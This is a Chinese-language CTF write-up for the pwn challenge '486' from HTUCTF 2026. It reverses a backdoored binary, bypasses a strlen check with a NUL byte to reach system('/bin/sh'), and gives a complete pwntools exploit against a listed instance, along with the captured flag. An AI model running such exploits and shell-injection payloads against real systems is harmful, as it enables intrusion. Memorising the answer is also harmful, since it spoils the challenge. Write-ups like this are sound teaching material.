# 冥河螺旋（486）（Pwn 1000pt）— HTUCTF 2026

- 实例：`103.163.47.230:33609`
- 附件：`486`（ELF64，PIE，有 canary）
- 脚本：`exp_486.py`
- flag：`HTUCTF{cbd8e89e-cfe2-4b2c-8e1b-6c9b6c2c7968}`

## 一、题目在说什么

题面「从零开始的异世界生活」「有两种解法，符合原著」，486 = スバル（菜月昴），
`0x1490` 那段藏了 `styxhelix`（Re:Zero ED）和「从零开始」的台词 —— 都在暗示
**从零 = strlen == 0**。

## 二、程序逻辑

```
main  0x1200:  srand(time(0)); puts("嘿，小哥，要来个苹果吗？"); game(0x1520)

game  0x1520:  猜拳循环
    puts("做出你的选择吧!");
    fgets(buf, 0x20, stdin);
    if (*(int*)buf == 0x000a312d)     // "-1\n"
        { puts("我一定会，拯救你！"); backdoor(0x1490); }
    else { rand()%3 -> 三句"死亡回归"台词; 错 6 次 -> puts("希望你能，从零开始"); exit(0); }

backdoor 0x1490:
    xmm0 = "styxhelix";  movaps [rsp], xmm0      // 先往栈上铺 9 字节提示串
    read(0, rsp, 9);
    if (strlen(rsp) <= 1) { puts("我的名字是菜月昴！…告诉我你的名字！");  system("/bin/sh"); }
    else                  { puts("真是傲慢啊....(进入傲慢if)"); guess_loop(0x1390); }

guess_loop 0x1390:
    arc4random() -> 4 字节原始字节串  ≟  strtol(输入) 的 4 字节
    相等 -> puts(那大段"傲慢"宣言) + system("/bin/sh")      // 第二条解法，纯靠撞
```

## 三、解法一（正解）：从零开始

`read(0, rsp, 9)` 只覆盖栈上 `styxhelix` 的前几个字节，但 `strlen` 只看第一个字节：
**发一个 NUL 字节**，`buf[0] = 0` → `strlen = 0 <= 1` → 直接进 `system("/bin/sh")`。

```python
s.sendall(b"-1\n")     # 进入后门（cmp dword ptr [buf], 0x000a312d）
s.sendall(b"\x00")     # strlen == 0 → getshell
```

## 四、第二个坎：命令必须和 NUL 同一个包

第一版脚本「先发 NUL，等打印台词，再发 `cat flag`」时，**一发包就 RST**，shell 秒死；
连接空闲时反而一直活着。原因是：

- `read(0, rsp, 9)` 会吃掉最多 9 字节，`/bin/sh` 共用同一个 stdin；
- 这套靶机的输入是「有多少送多少」的转发，**后续单独发送的包到不了 shell**。

解决办法：把命令和 NUL 塞进同一个 TCP 包，前面留 8 字节填充给 `read(0, rsp, 9)` 吃掉：

```python
s.sendall(b"\x00" + b"AAAAAAAA" + b"\n" + b"cat flag;ls -la\n")
#               └─ 9 字节被 read 吃掉 ─┘   └─ 留给 /bin/sh ─┘
```

验证这一点做了个字节级实验：发 `NUL + "A"*n + ";echo MARK\n"`，看报错里剩下几个 A：

| 发送 | dash 报错 | 结论 |
| --- | --- | --- |
| `NUL + "A"*10` | `AA: not found` | `read` 吃了 8 个 A + NUL = 9 字节 |
| `NUL + "A"*20` | `AAAAAAAAAAAA: not found` | 同上，固定 9 字节 |

## 五、环境信息

容器 `/entrypoint.sh`：

```sh
printf '%s\n' "$GZCTF_FLAG" > /home/ctf/flag     # flag 在这里
cd /home/ctf
exec su -s /bin/sh ctf -c 'cd /home/ctf && exec socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/ctf/486,stderr'
```

flag 在 `/home/ctf/flag`（不是 `/flag`），`cat flag` 即可。

## 六、最终 payload

```python
from pwn import *
context.arch = "amd64"
r = remote("103.163.47.230", 33609)
r.recvuntil(b"\xef\xbc\x81\n")                      # "做出你的选择吧!"
r.send(b"-1\n")
r.recvuntil(b"\xef\xbc\x81\n")                      # "我一定会，拯救你!"
r.send(b"\x00" + b"AAAAAAAA" + b"\ncat flag;ls -la\n")
print(r.recvrepeat(2))
```

```
HTUCTF{cbd8e89e-cfe2-4b2c-8e1b-6c9b6c2c7968}
```

## 七、踩坑总结

1. `strlen(buf) <= 1` 这种判断，**发一个 NUL** 比构造 1 字节字符串更干脆。
2. 8/9 字节的 `read` 会吞掉紧随其后的命令字节 —— 命令要和 payload 同包，并给 `read` 预留填充。
3. 同一容器里「分两次发送」会导致 RST，看起来像 shell 秒退；实际是输入通道的问题，不是利用崩了。
